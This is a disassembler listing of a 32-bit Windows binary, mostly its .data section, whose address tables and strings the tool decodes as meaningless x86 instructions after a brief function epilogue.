  412bfb:	dec    ebx
  412bfc:	xor    edx,edx
  412bfe:	add    DWORD PTR [ebp-0xc],ebx
  412c01:	pop    ebx
  412c02:	mov    eax,DWORD PTR [ebp-0xc]
  412c05:	pop    edi
  412c06:	pop    esi
  412c07:	pop    ebx
  412c08:	leave  
  412c09:	ret    0x10

Disassembly of section .data:

00413000 <.data>:
  413000:	xor    al,0x39
  413002:	add    DWORD PTR [eax],eax
  413004:	inc    edx
  413005:	cmp    DWORD PTR [ecx],eax
  413007:	add    BYTE PTR [ecx+edi*1+0x1],cl
  41300b:	add    BYTE PTR [ecx+edi*1+0x1],dl
  41300f:	add    BYTE PTR [esi+0x39],bl
  413012:	add    DWORD PTR [eax],eax
  413014:	push   0x39
  413016:	add    DWORD PTR [eax],eax
  413018:	jl     0x413053
  41301a:	add    DWORD PTR [eax],eax
  41301c:	xchg   BYTE PTR [ecx],bh
  41301e:	add    DWORD PTR [eax],eax
  413020:	xchg   esp,eax
  413021:	cmp    DWORD PTR [ecx],eax
  413023:	add    BYTE PTR [ecx+edi*1+0x39a80001],bl
  41302a:	add    DWORD PTR [eax],eax
  41302c:	mov    ah,0x39
  41302e:	add    DWORD PTR [eax],eax
  413030:	les    edi,FWORD PTR [ecx]
  413032:	add    DWORD PTR [eax],eax
  413034:	into   
  413035:	cmp    DWORD PTR [ecx],eax
  413037:	add    dh,dl
  413039:	cmp    DWORD PTR [ecx],eax
  41303b:	add    dl,ah
  41303d:	cmp    DWORD PTR [ecx],eax
  41303f:	add    dl,ch
  413041:	cmp    DWORD PTR [ecx],eax
  413043:	add    ah,dh
  413045:	cmp    DWORD PTR [ecx],eax
  413047:	add    ah,bh
  413049:	cmp    DWORD PTR [ecx],eax
  41304b:	add    BYTE PTR [eax],cl
  41304d:	cmp    al,BYTE PTR [ecx]
  41304f:	add    BYTE PTR [edx],dl
  413051:	cmp    al,BYTE PTR [ecx]
  413053:	add    BYTE PTR [edx],bl
  413055:	cmp    al,BYTE PTR [ecx]
  413057:	add    BYTE PTR [edx+edi*1],ah
  41305a:	add    DWORD PTR [eax],eax
  41305c:	xor    BYTE PTR [edx],bh
  41305e:	add    DWORD PTR [eax],eax
  413060:	cmp    bh,BYTE PTR [edx]
  413062:	add    DWORD PTR [eax],eax
  413064:	dec    eax
  413065:	cmp    al,BYTE PTR [ecx]
  413067:	add    BYTE PTR [edx+0x3a],dl
  41306a:	add    DWORD PTR [eax],eax
  41306c:	pop    esi
  41306d:	cmp    al,BYTE PTR [ecx]
  41306f:	add    BYTE PTR [edx+edi*1+0x1],ch
  413073:	add    BYTE PTR [edx+0x3a],bh
  413076:	add    DWORD PTR [eax],eax
  413078:	test   BYTE PTR [edx],bh
  41307a:	add    DWORD PTR [eax],eax
  41307c:	mov    ?,WORD PTR [edx]
  41307e:	add    DWORD PTR [eax],eax
  413080:	cwde   
  413081:	cmp    al,BYTE PTR [ecx]
  413083:	add    BYTE PTR [edx-0x55fffec6],ah
  413089:	cmp    al,BYTE PTR [ecx]
  41308b:	add    BYTE PTR [edx+edi*1+0x3abe0001],dh
  413092:	add    DWORD PTR [eax],eax
  413094:	enter  0x13a,0x0
  413098:	fdivr  QWORD PTR [edx]
  41309a:	add    DWORD PTR [eax],eax
  41309c:	out    0x3a,al
  41309e:	add    DWORD PTR [eax],eax
  4130a0:	repnz cmp al,BYTE PTR [ecx]
  4130a3:	add    dh,bh
  4130a5:	cmp    al,BYTE PTR [ecx]
  4130a7:	add    BYTE PTR [eax],cl
  4130a9:	cmp    eax,DWORD PTR [ecx]
  4130ab:	add    BYTE PTR [eax],bl
  4130ad:	cmp    eax,DWORD PTR [ecx]
  4130af:	add    BYTE PTR [eax],al
  4130b1:	add    BYTE PTR [eax],al
  4130b3:	add    BYTE PTR [esi],ch
  4130b5:	cmp    eax,DWORD PTR [ecx]
  4130b7:	add    BYTE PTR [edx+0x3b],al
  4130ba:	add    DWORD PTR [eax],eax
  4130bc:	pop    eax
  4130bd:	cmp    eax,DWORD PTR [ecx]
  4130bf:	add    BYTE PTR [eax+0x3b],ch
  4130c2:	add    DWORD PTR [eax],eax
  4130c4:	je     0x413101
  4130c6:	add    DWORD PTR [eax],eax
  4130c8:	nop
  4130c9:	cmp    eax,DWORD PTR [ecx]
  4130cb:	add    BYTE PTR [ebx+edi*1+0x3bb40001],bl
  4130d2:	add    DWORD PTR [eax],eax
  4130d4:	int3   
  4130d5:	cmp    eax,DWORD PTR [ecx]
  4130d7:	add    dl,bl
  4130d9:	cmp    eax,DWORD PTR [ecx]
  4130db:	add    dh,ah
  4130dd:	cmp    eax,DWORD PTR [ecx]
  4130df:	add    al,bh
  4130e1:	cmp    eax,DWORD PTR [ecx]
  4130e3:	add    BYTE PTR [esp+edi*1],cl
  4130e6:	add    DWORD PTR [eax],eax
  4130e8:	sbb    bh,BYTE PTR [ecx+eax*1]
  4130eb:	add    BYTE PTR [edx],ch
  4130ed:	cmp    al,0x1
  4130ef:	add    BYTE PTR [edx],bh
  4130f1:	cmp    al,0x1
  4130f3:	add    BYTE PTR [esi+0x3c],cl
  4130f6:	add    DWORD PTR [eax],eax
  4130f8:	pop    edx
  4130f9:	cmp    al,0x1
  4130fb:	add    BYTE PTR [edx+0x3c],ch
  4130fe:	add    DWORD PTR [eax],eax
  413100:	js     0x41313e
  413102:	add    DWORD PTR [eax],eax
  413104:	xchg   edx,eax
  413105:	cmp    al,0x1
  413107:	add    BYTE PTR [esp+edi*1+0x3cb20001],ah
  41310e:	add    DWORD PTR [eax],eax
  413110:	ret    0x13c
  413113:	add    ah,dl
  413115:	cmp    al,0x1
  413117:	add    dh,ah
  413119:	cmp    al,0x1
  41311b:	add    ah,dh
  41311d:	cmp    al,0x1
  41311f:	add    dh,bh
  413121:	cmp    al,0x1
  413123:	add    BYTE PTR [esi],cl
  413125:	cmp    eax,0x3d1e0001
  41312a:	add    DWORD PTR [eax],eax
  41312c:	sub    al,0x3d
  41312e:	add    DWORD PTR [eax],eax
  413130:	cmp    bh,BYTE PTR ds:0x3d4c0001
  413136:	add    DWORD PTR [eax],eax
  413138:	pop    eax
  413139:	cmp    eax,0x3d6e0001
  41313e:	add    DWORD PTR [eax],eax
  413140:	cmp    BYTE PTR ds:0x3d920001,0x1
  413147:	add    BYTE PTR [esi-0x45fffec3],ah
  41314d:	cmp    eax,0x3dce0001
  413152:	add    DWORD PTR [eax],eax
  413154:	jmp    0x13d:0xf800013d
  41315b:	add    BYTE PTR [esi],al
  41315d:	add    DWORD PTR ds:[eax],eax
  413160:	sbb    al,0x3e
  413162:	add    DWORD PTR [eax],eax
  413164:	sub    bh,BYTE PTR [esi]
  413166:	add    DWORD PTR [eax],eax
  413168:	cmp    al,0x3e
  41316a:	add    DWORD PTR [eax],eax
  41316c:	dec    eax
  41316d:	add    DWORD PTR ds:[eax],eax
  413170:	pop    esp
  413171:	add    DWORD PTR ds:[eax],eax
  413174:	ins    BYTE PTR es:[edi],dx
  413175:	add    DWORD PTR ds:[eax],eax
  413178:	jl     0x4131b8
  41317a:	add    DWORD PTR [eax],eax
  41317c:	mov    BYTE PTR [esi],bh
  41317e:	add    DWORD PTR [eax],eax
  413180:	cwde   
  413181:	add    DWORD PTR ds:[eax],eax
  413184:	lods   al,BYTE PTR ds:[esi]
  413185:	add    DWORD PTR ds:[eax],eax
  413188:	mov    edx,0xcc00013e
  41318d:	add    DWORD PTR ds:[eax],eax
  413190:	fidivr DWORD PTR [esi]
  413192:	add    DWORD PTR [eax],eax
  413194:	lock add DWORD PTR ds:[eax],eax
  413198:	(bad)  
  413199:	add    DWORD PTR ds:[eax],eax
  41319c:	push   cs
  41319d:	aas    
  41319e:	add    DWORD PTR [eax],eax
  4131a0:	sbb    bh,BYTE PTR [edi]
  4131a2:	add    DWORD PTR [eax],eax
  4131a4:	sub    bh,BYTE PTR [edi]
  4131a6:	add    DWORD PTR [eax],eax
  4131a8:	cmp    BYTE PTR [edi],bh
  4131aa:	add    DWORD PTR [eax],eax
  4131ac:	dec    esi
  4131ad:	aas    
  4131ae:	add    DWORD PTR [eax],eax
  4131b0:	bound  edi,QWORD PTR [edi]
  4131b2:	add    DWORD PTR [eax],eax
  4131b4:	outs   dx,BYTE PTR ds:[esi]
  4131b5:	aas    
  4131b6:	add    DWORD PTR [eax],eax
  4131b8:	js     0x4131f9
  4131ba:	add    DWORD PTR [eax],eax
  4131bc:	xchg   BYTE PTR [edi],bh
  4131be:	add    DWORD PTR [eax],eax
  4131c0:	xchg   esp,eax
  4131c1:	aas    
  4131c2:	add    DWORD PTR [eax],eax
  4131c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4131c5:	aas    
  4131c6:	add    DWORD PTR [eax],eax
  4131c8:	mov    dh,0x3f
  4131ca:	add    DWORD PTR [eax],eax
  4131cc:	enter  0x13f,0x0
  4131d0:	fidivr DWORD PTR [edi]
  4131d2:	add    DWORD PTR [eax],eax
  4131d4:	in     al,dx
  4131d5:	aas    
  4131d6:	add    DWORD PTR [eax],eax
  4131d8:	clc    
  4131d9:	aas    
  4131da:	add    DWORD PTR [eax],eax
  4131dc:	or     al,BYTE PTR [eax+0x1]
  4131df:	add    BYTE PTR [edx],ah
  4131e1:	inc    eax
  4131e2:	add    DWORD PTR [eax],eax
  4131e4:	xor    al,0x40
  4131e6:	add    DWORD PTR [eax],eax
  4131e8:	dec    eax
  4131e9:	inc    eax
  4131ea:	add    DWORD PTR [eax],eax
  4131ec:	pop    edx
  4131ed:	inc    eax
  4131ee:	add    DWORD PTR [eax],eax
  4131f0:	fs inc eax
  4131f2:	add    DWORD PTR [eax],eax
  4131f4:	je     0x413236
  4131f6:	add    DWORD PTR [eax],eax
  4131f8:	add    BYTE PTR [eax+0x1],0x0
  4131fc:	cwde   
  4131fd:	inc    eax
  4131fe:	add    DWORD PTR [eax],eax
  413200:	lods   al,BYTE PTR ds:[esi]
  413201:	inc    eax
  413202:	add    DWORD PTR [eax],eax
  413204:	mov    esp,0xca000140
  413209:	inc    eax
  41320a:	add    DWORD PTR [eax],eax
  41320c:	loopne 0x41324e
  41320e:	add    DWORD PTR [eax],eax
  413210:	lock inc eax
  413212:	add    DWORD PTR [eax],eax
  413214:	or     BYTE PTR [ecx+0x1],al
  413217:	add    BYTE PTR [esi],dl
  413219:	inc    ecx
  41321a:	add    DWORD PTR [eax],eax
  41321c:	sub    BYTE PTR [ecx+0x1],al
  41321f:	add    BYTE PTR [esi],dh
  413221:	inc    ecx
  413222:	add    DWORD PTR [eax],eax
  413224:	inc    esp
  413225:	inc    ecx
  413226:	add    DWORD PTR [eax],eax
  413228:	push   edx
  413229:	inc    ecx
  41322a:	add    DWORD PTR [eax],eax
  41322c:	pusha  
  41322d:	inc    ecx
  41322e:	add    DWORD PTR [eax],eax
  413230:	jo     0x413273
  413232:	add    DWORD PTR [eax],eax
  413234:	test   BYTE PTR [ecx+0x1],al
  413237:	add    BYTE PTR [edx-0x5ffffebf],dl
  41323d:	inc    ecx
  41323e:	add    DWORD PTR [eax],eax
  413240:	scas   al,BYTE PTR es:[edi]
  413241:	inc    ecx
  413242:	add    DWORD PTR [eax],eax
  413244:	mov    esi,0xd6000141
  413249:	inc    ecx
  41324a:	add    DWORD PTR [eax],eax
  41324c:	call   0xfa413392
  413251:	inc    ecx
  413252:	add    DWORD PTR [eax],eax
  413254:	push   es
  413255:	inc    edx
  413256:	add    DWORD PTR [eax],eax
  413258:	sbb    BYTE PTR [edx+0x1],al
  41325b:	add    BYTE PTR [esi],ch
  41325d:	inc    edx
  41325e:	add    DWORD PTR [eax],eax
  413260:	cmp    al,BYTE PTR [edx+0x1]
  413263:	add    BYTE PTR [esi+0x42],cl
  413266:	add    DWORD PTR [eax],eax
  413268:	pusha  
  413269:	inc    edx
  41326a:	add    DWORD PTR [eax],eax
  41326c:	add    BYTE PTR [eax],al
  41326e:	add    BYTE PTR [eax],al
  413270:	add    BYTE PTR [edx+0x1],0x0
  413274:	cwde   
  413275:	inc    edx
  413276:	add    DWORD PTR [eax],eax
  413278:	scas   al,BYTE PTR es:[edi]
  413279:	inc    edx
  41327a:	add    DWORD PTR [eax],eax
  41327c:	mov    edx,0xca000142
  413281:	inc    edx
  413282:	add    DWORD PTR [eax],eax
  413284:	fadd   QWORD PTR [edx+0x1]
  413287:	add    ah,ch
  413289:	inc    edx
  41328a:	add    DWORD PTR [eax],eax
  41328c:	clc    
  41328d:	inc    edx
  41328e:	add    DWORD PTR [eax],eax
  413290:	push   cs
  413291:	inc    ebx
  413292:	add    DWORD PTR [eax],eax
  413294:	sbb    BYTE PTR [ebx+0x1],al
  413297:	add    BYTE PTR [ebx+eax*2],ah
  41329a:	add    DWORD PTR [eax],eax
  41329c:	xor    al,BYTE PTR [ebx+0x1]
  41329f:	add    BYTE PTR [edx+0x43],al
  4132a2:	add    DWORD PTR [eax],eax
  4132a4:	push   eax
  4132a5:	inc    ebx
  4132a6:	add    DWORD PTR [eax],eax
  4132a8:	pop    edx
  4132a9:	inc    ebx
  4132aa:	add    DWORD PTR [eax],eax
  4132ac:	outs   dx,BYTE PTR ds:[esi]
  4132ad:	inc    ebx
  4132ae:	add    DWORD PTR [eax],eax
  4132b0:	test   BYTE PTR [ebx+0x1],al
  4132b3:	add    BYTE PTR [ebx+eax*2+0x43a40001],dl
  4132ba:	add    DWORD PTR [eax],eax
  4132bc:	mov    eax,0xcc000143
  4132c1:	inc    ebx
  4132c2:	add    DWORD PTR [eax],eax
  4132c4:	fiadd  DWORD PTR [ebx+0x1]
  4132c7:	add    dl,ch
  4132c9:	inc    ebx
  4132ca:	add    DWORD PTR [eax],eax
  4132cc:	clc    
  4132cd:	inc    ebx
  4132ce:	add    DWORD PTR [eax],eax
  4132d0:	or     BYTE PTR [ecx+eax*1+0x0],al
  4132d4:	adc    al,0x44
  4132d6:	add    DWORD PTR [eax],eax
  4132d8:	and    BYTE PTR [ecx+eax*1+0x0],al
  4132dc:	xor    al,0x44
  4132de:	add    DWORD PTR [eax],eax
  4132e0:	inc    esi
  4132e1:	inc    esp
  4132e2:	add    DWORD PTR [eax],eax
  4132e4:	pop    edx
  4132e5:	inc    esp
  4132e6:	add    DWORD PTR [eax],eax
  4132e8:	inc    sp
  4132ea:	add    DWORD PTR [eax],eax
  4132ec:	jbe    0x413332
  4132ee:	add    DWORD PTR [eax],eax
  4132f0:	mov    es,WORD PTR [ecx+eax*1+0x0]
  4132f4:	sahf   
  4132f5:	inc    esp
  4132f6:	add    DWORD PTR [eax],eax
  4132f8:	scas   al,BYTE PTR es:[edi]
  4132f9:	inc    esp
  4132fa:	add    DWORD PTR [eax],eax
  4132fc:	mov    BYTE PTR [ecx+eax*1+0x0],0xd0
  413301:	inc    esp
  413302:	add    DWORD PTR [eax],eax
  413304:	in     al,dx
  413305:	inc    esp
  413306:	add    DWORD PTR [eax],eax
  413308:	clc    
  413309:	inc    esp
  41330a:	add    DWORD PTR [eax],eax
  41330c:	or     al,BYTE PTR [ebp+0x1]
  41330f:	add    BYTE PTR [esi],bl
  413311:	inc    ebp
  413312:	add    DWORD PTR [eax],eax
  413314:	sub    BYTE PTR [ebp+0x1],al
  413317:	add    BYTE PTR [eax],bh
  413319:	inc    ebp
  41331a:	add    DWORD PTR [eax],eax
  41331c:	inc    esp
  41331d:	inc    ebp
  41331e:	add    DWORD PTR [eax],eax
  413320:	dec    esi
  413321:	inc    ebp
  413322:	add    DWORD PTR [eax],eax
  413324:	pop    edx
  413325:	inc    ebp
  413326:	add    DWORD PTR [eax],eax
  413328:	add    BYTE PTR [eax],al
  41332a:	add    BYTE PTR [eax],al
  41332c:	jbe    0x413373
  41332e:	add    DWORD PTR [eax],eax
  413330:	mov    BYTE PTR [ebp+0x1],al
  413333:	add    BYTE PTR [eax-0x51fffebb],ah
  413339:	inc    ebp
  41333a:	add    DWORD PTR [eax],eax
  41333c:	retf   0x145
  41333f:	add    ah,bl
  413341:	inc    ebp
  413342:	add    DWORD PTR [eax],eax
  413344:	in     al,dx
  413345:	inc    ebp
  413346:	add    DWORD PTR [eax],eax
  413348:	add    BYTE PTR [esi+0x1],al
  41334b:	add    BYTE PTR [eax],bl
  41334d:	inc    esi
  41334e:	add    DWORD PTR [eax],eax
  413350:	sub    al,BYTE PTR [esi+0x1]
  413353:	add    BYTE PTR [esi],dh
  413355:	inc    esi
  413356:	add    DWORD PTR [eax],eax
  413358:	dec    edx
  413359:	inc    esi
  41335a:	add    DWORD PTR [eax],eax
  41335c:	pusha  
  41335d:	inc    esi
  41335e:	add    DWORD PTR [eax],eax
  413360:	ins    BYTE PTR es:[edi],dx
  413361:	inc    esi
  413362:	add    DWORD PTR [eax],eax
  413364:	add    BYTE PTR [esi+0x1],0x0
  413368:	xchg   esp,eax
  413369:	inc    esi
  41336a:	add    DWORD PTR [eax],eax
  41336c:	mov    al,ds:0xae000146
  413371:	inc    esi
  413372:	add    DWORD PTR [eax],eax
  413374:	ret    0x146
  413377:	add    dl,bl
  413379:	inc    esi
  41337a:	add    DWORD PTR [eax],eax
  41337c:	call   0xf24134c7
  413381:	inc    esi
  413382:	add    DWORD PTR [eax],eax
  413384:	inc    BYTE PTR [esi+0x1]
  413387:	add    BYTE PTR [esi],cl
  413389:	inc    edi
  41338a:	add    DWORD PTR [eax],eax
  41338c:	and    al,0x47
  41338e:	add    DWORD PTR [eax],eax
  413390:	cmp    al,BYTE PTR [edi+0x1]
  413393:	add    BYTE PTR [edi+eax*2+0x1],cl
  413397:	add    BYTE PTR [edx+0x47],bl
  41339a:	add    DWORD PTR [eax],eax
  41339c:	push   0x47
  41339e:	add    DWORD PTR [eax],eax
  4133a0:	jle    0x4133e9
  4133a2:	add    DWORD PTR [eax],eax
  4133a4:	xchg   esi,eax
  4133a5:	inc    edi
  4133a6:	add    DWORD PTR [eax],eax
  4133a8:	mov    ds:0xba000147,al
  4133ad:	inc    edi
  4133ae:	add    DWORD PTR [eax],eax
  4133b0:	int3   
  4133b1:	inc    edi
  4133b2:	add    DWORD PTR [eax],eax
  4133b4:	fadd   QWORD PTR [edi+0x1]
  4133b7:	add    al,dh
  4133b9:	inc    edi
  4133ba:	add    DWORD PTR [eax],eax
  4133bc:	push   es
  4133bd:	dec    eax
  4133be:	add    DWORD PTR [eax],eax
  4133c0:	sbb    cl,BYTE PTR [eax+0x1]
  4133c3:	add    BYTE PTR [eax],ch
  4133c5:	dec    eax
  4133c6:	add    DWORD PTR [eax],eax
  4133c8:	cmp    cl,BYTE PTR [eax+0x1]
  4133cb:	add    BYTE PTR [eax+0x48],cl
  4133ce:	add    DWORD PTR [eax],eax
  4133d0:	push   esp
  4133d1:	dec    eax
  4133d2:	add    DWORD PTR [eax],eax
  4133d4:	outs   dx,BYTE PTR ds:[esi]
  4133d5:	dec    eax
  4133d6:	add    DWORD PTR [eax],eax
  4133d8:	mov    BYTE PTR [eax+0x1],cl
  4133db:	add    BYTE PTR [eax-0x59fffeb8],bl
  4133e1:	dec    eax
  4133e2:	add    DWORD PTR [eax],eax
  4133e4:	mov    dl,0x48
  4133e6:	add    DWORD PTR [eax],eax
  4133e8:	ror    BYTE PTR [eax+0x1],0x0
  4133ec:	(bad)  
  4133ed:	dec    eax
  4133ee:	add    DWORD PTR [eax],eax
  4133f0:	add    BYTE PTR [eax],al
  4133f2:	add    BYTE PTR [eax],al
  4133f4:	lock dec eax
  4133f6:	add    DWORD PTR [eax],eax
  4133f8:	dec    BYTE PTR [eax+0x1]
  4133fb:	add    BYTE PTR [esi],cl
  4133fd:	dec    ecx
  4133fe:	add    DWORD PTR [eax],eax
  413400:	push   ds
  413401:	dec    ecx
  413402:	add    DWORD PTR [eax],eax
  413404:	cs dec ecx
  413406:	add    DWORD PTR [eax],eax
  413408:	add    BYTE PTR [eax],al
  41340a:	add    BYTE PTR [eax],al
  41340c:	push   eax
  41340d:	dec    ecx
  41340e:	add    DWORD PTR [eax],eax
	...
  413418:	stos   DWORD PTR es:[edi],eax
  413419:	inc    ebx
  41341a:	push   ebp
  41341b:	dec    ebp
  41341c:	add    BYTE PTR [eax],al
  41341e:	add    BYTE PTR [eax],al
  413420:	add    al,BYTE PTR [eax]
  413422:	add    BYTE PTR [eax],al
  413424:	cmp    eax,0xc3000000
  413429:	dec    eax
  41342a:	add    eax,DWORD PTR [eax]
  41342c:	ret    
  41342d:	cmp    al,BYTE PTR [ebx]
	...
  413437:	add    BYTE PTR [ebx+0x4d5543],ch
  41343d:	add    BYTE PTR [eax],al
  41343f:	add    BYTE PTR [esi+0x34],ah
  413442:	add    DWORD PTR [eax],eax
  413444:	add    DWORD PTR [eax],eax
  413446:	add    BYTE PTR [eax],al
  413448:	add    DWORD PTR [eax],eax
  41344a:	add    BYTE PTR [eax],al
  41344c:	add    DWORD PTR [eax],eax
  41344e:	add    BYTE PTR [eax],al
  413450:	pop    esp
  413451:	xor    al,0x1
  413453:	add    BYTE PTR [eax+0x34],ah
  413456:	add    DWORD PTR [eax],eax
  413458:	fs xor al,0x1
  41345b:	add    ch,cl
  41345d:	sub    BYTE PTR [eax],al
  41345f:	add    BYTE PTR [edi+0x34],dh
  413462:	add    DWORD PTR [eax],eax
  413464:	add    BYTE PTR [eax],al
  413466:	jb     0x4134d5
  413468:	ins    DWORD PTR es:[edi],dx
  413469:	pop    ecx
  41346a:	dec    eax
  41346b:	outs   dx,DWORD PTR ds:[esi]
  41346c:	imul   ecx,DWORD PTR [eax+0x6c],0x68
  413470:	ja     0x4134e1
  413472:	imul   ebp,DWORD PTR cs:[esi+0x73],0x69483f00
  41347a:	fs gs dec ebx
  41347d:	gs jns 0x4134e2
  413480:	outs   dx,DWORD PTR ds:[esi]
  413481:	popa   
  413482:	jb     0x4134e8
  413484:	dec    esi
  413485:	gs ja  0x4134c8
  413488:	inc    eax
  413489:	pop    ecx
  41348a:	inc    edi
  41348b:	pop    eax
  41348c:	inc    esp
  41348d:	cmp    al,0x56
  41348f:	add    BYTE PTR [eax],al
  413491:	add    BYTE PTR [eax],al
  413493:	add    BYTE PTR [eax],ah
  413495:	xor    eax,0x1
  41349a:	add    BYTE PTR [eax],al
  41349c:	add    BYTE PTR [eax],al
  41349e:	add    BYTE PTR [eax],al
  4134a0:	and    bh,BYTE PTR [ebx]
  4134a2:	add    DWORD PTR [eax],eax
  4134a4:	add    BYTE PTR [eax],dh
  4134a6:	add    DWORD PTR [eax],eax
  4134a8:	aam    0x35
  4134aa:	add    DWORD PTR [eax],eax
	...
  4134b4:	je     0x4134f8
  4134b6:	add    DWORD PTR [eax],eax
  4134b8:	mov    ah,0x30
  4134ba:	add    DWORD PTR [eax],eax
  4134bc:	nop
  4134bd:	aaa    
  4134be:	add    DWORD PTR [eax],eax
	...
  4134c8:	ins    BYTE PTR es:[edi],dx
  4134c9:	inc    ebp
  4134ca:	add    DWORD PTR [eax],eax
  4134cc:	jo     0x413500
  4134ce:	add    DWORD PTR [eax],eax
  4134d0:	dec    esp
  4134d1:	cmp    BYTE PTR [ecx],al
	...
  4134db:	add    dl,ah
  4134dd:	dec    eax
  4134de:	add    DWORD PTR [eax],eax
  4134e0:	sub    al,0x33
  4134e2:	add    DWORD PTR [eax],eax
  4134e4:	adc    al,0x39
  4134e6:	add    DWORD PTR [eax],eax
	...
  4134f0:	inc    edx
  4134f1:	dec    ecx
  4134f2:	add    DWORD PTR [eax],eax
  4134f4:	hlt    
  4134f5:	xor    eax,DWORD PTR [ecx]
  4134f7:	add    BYTE PTR [ecx+edi*1],ch
  4134fa:	add    DWORD PTR [eax],eax
	...
  413504:	bound  ecx,QWORD PTR [ecx+0x1]
  413507:	add    BYTE PTR [esp+esi*1],cl
  41350a:	add    DWORD PTR [eax],eax
	...
  413520:	xor    al,0x39
  413522:	add    DWORD PTR [eax],eax
  413524:	inc    edx
  413525:	cmp    DWORD PTR [ecx],eax
  413527:	add    BYTE PTR [ecx+edi*1+0x1],cl
  41352b:	add    BYTE PTR [ecx+edi*1+0x1],dl
  41352f:	add    BYTE PTR [esi+0x39],bl
  413532:	add    DWORD PTR [eax],eax
  413534:	push   0x39
  413536:	add    DWORD PTR [eax],eax
  413538:	jl     0x413573
  41353a:	add    DWORD PTR [eax],eax
  41353c:	xchg   BYTE PTR [ecx],bh
  41353e:	add    DWORD PTR [eax],eax
  413540:	xchg   esp,eax
  413541:	cmp    DWORD PTR [ecx],eax
  413543:	add    BYTE PTR [ecx+edi*1+0x39a80001],bl
  41354a:	add    DWORD PTR [eax],eax
  41354c:	mov    ah,0x39
  41354e:	add    DWORD PTR [eax],eax
  413550:	les    edi,FWORD PTR [ecx]
  413552:	add    DWORD PTR [eax],eax
  413554:	into   
  413555:	cmp    DWORD PTR [ecx],eax
  413557:	add    dh,dl
  413559:	cmp    DWORD PTR [ecx],eax
  41355b:	add    dl,ah
  41355d:	cmp    DWORD PTR [ecx],eax
  41355f:	add    dl,ch
  413561:	cmp    DWORD PTR [ecx],eax
  413563:	add    ah,dh
  413565:	cmp    DWORD PTR [ecx],eax
  413567:	add    ah,bh
  413569:	cmp    DWORD PTR [ecx],eax
  41356b:	add    BYTE PTR [eax],cl
  41356d:	cmp    al,BYTE PTR [ecx]
  41356f:	add    BYTE PTR [edx],dl
  413571:	cmp    al,BYTE PTR [ecx]
  413573:	add    BYTE PTR [edx],bl
  413575:	cmp    al,BYTE PTR [ecx]
  413577:	add    BYTE PTR [edx+edi*1],ah
  41357a:	add    DWORD PTR [eax],eax
  41357c:	xor    BYTE PTR [edx],bh
  41357e:	add    DWORD PTR [eax],eax
  413580:	cmp    bh,BYTE PTR [edx]
  413582:	add    DWORD PTR [eax],eax
  413584:	dec    eax
  413585:	cmp    al,BYTE PTR [ecx]
  413587:	add    BYTE PTR [edx+0x3a],dl
  41358a:	add    DWORD PTR [eax],eax
  41358c:	pop    esi
  41358d:	cmp    al,BYTE PTR [ecx]
  41358f:	add    BYTE PTR [edx+edi*1+0x1],ch
  413593:	add    BYTE PTR [edx+0x3a],bh
  413596:	add    DWORD PTR [eax],eax
  413598:	test   BYTE PTR [edx],bh
  41359a:	add    DWORD PTR [eax],eax
  41359c:	mov    ?,WORD PTR [edx]
  41359e:	add    DWORD PTR [eax],eax
  4135a0:	cwde   
  4135a1:	cmp    al,BYTE PTR [ecx]
  4135a3:	add    BYTE PTR [edx-0x55fffec6],ah
  4135a9:	cmp    al,BYTE PTR [ecx]
  4135ab:	add    BYTE PTR [edx+edi*1+0x3abe0001],dh
  4135b2:	add    DWORD PTR [eax],eax
  4135b4:	enter  0x13a,0x0
  4135b8:	fdivr  QWORD PTR [edx]
  4135ba:	add    DWORD PTR [eax],eax
  4135bc:	out    0x3a,al
  4135be:	add    DWORD PTR [eax],eax
  4135c0:	repnz cmp al,BYTE PTR [ecx]
  4135c3:	add    dh,bh
  4135c5:	cmp    al,BYTE PTR [ecx]
  4135c7:	add    BYTE PTR [eax],cl
  4135c9:	cmp    eax,DWORD PTR [ecx]
  4135cb:	add    BYTE PTR [eax],bl
  4135cd:	cmp    eax,DWORD PTR [ecx]
  4135cf:	add    BYTE PTR [eax],al
  4135d1:	add    BYTE PTR [eax],al
  4135d3:	add    BYTE PTR [esi],ch
  4135d5:	cmp    eax,DWORD PTR [ecx]
  4135d7:	add    BYTE PTR [edx+0x3b],al
  4135da:	add    DWORD PTR [eax],eax
  4135dc:	pop    eax
  4135dd:	cmp    eax,DWORD PTR [ecx]
  4135df:	add    BYTE PTR [eax+0x3b],ch
  4135e2:	add    DWORD PTR [eax],eax
  4135e4:	je     0x413621
  4135e6:	add    DWORD PTR [eax],eax
  4135e8:	nop
  4135e9:	cmp    eax,DWORD PTR [ecx]
  4135eb:	add    BYTE PTR [ebx+edi*1+0x3bb40001],bl
  4135f2:	add    DWORD PTR [eax],eax
  4135f4:	int3   
  4135f5:	cmp    eax,DWORD PTR [ecx]
  4135f7:	add    dl,bl
  4135f9:	cmp    eax,DWORD PTR [ecx]
  4135fb:	add    dh,ah
  4135fd:	cmp    eax,DWORD PTR [ecx]
  4135ff:	add    al,bh
  413601:	cmp    eax,DWORD PTR [ecx]
  413603:	add    BYTE PTR [esp+edi*1],cl
  413606:	add    DWORD PTR [eax],eax
  413608:	sbb    bh,BYTE PTR [ecx+eax*1]
  41360b:	add    BYTE PTR [edx],ch
  41360d:	cmp    al,0x1
  41360f:	add    BYTE PTR [edx],bh
  413611:	cmp    al,0x1
  413613:	add    BYTE PTR [esi+0x3c],cl
  413616:	add    DWORD PTR [eax],eax
  413618:	pop    edx
  413619:	cmp    al,0x1
  41361b:	add    BYTE PTR [edx+0x3c],ch
  41361e:	add    DWORD PTR [eax],eax
  413620:	js     0x41365e
  413622:	add    DWORD PTR [eax],eax
  413624:	xchg   edx,eax
  413625:	cmp    al,0x1
  413627:	add    BYTE PTR [esp+edi*1+0x3cb20001],ah
  41362e:	add    DWORD PTR [eax],eax
  413630:	ret    0x13c
  413633:	add    ah,dl
  413635:	cmp    al,0x1
  413637:	add    dh,ah
  413639:	cmp    al,0x1
  41363b:	add    ah,dh
  41363d:	cmp    al,0x1
  41363f:	add    dh,bh
  413641:	cmp    al,0x1
  413643:	add    BYTE PTR [esi],cl
  413645:	cmp    eax,0x3d1e0001
  41364a:	add    DWORD PTR [eax],eax
  41364c:	sub    al,0x3d
  41364e:	add    DWORD PTR [eax],eax
  413650:	cmp    bh,BYTE PTR ds:0x3d4c0001
  413656:	add    DWORD PTR [eax],eax
  413658:	pop    eax
  413659:	cmp    eax,0x3d6e0001
  41365e:	add    DWORD PTR [eax],eax
  413660:	cmp    BYTE PTR ds:0x3d920001,0x1
  413667:	add    BYTE PTR [esi-0x45fffec3],ah
  41366d:	cmp    eax,0x3dce0001
  413672:	add    DWORD PTR [eax],eax
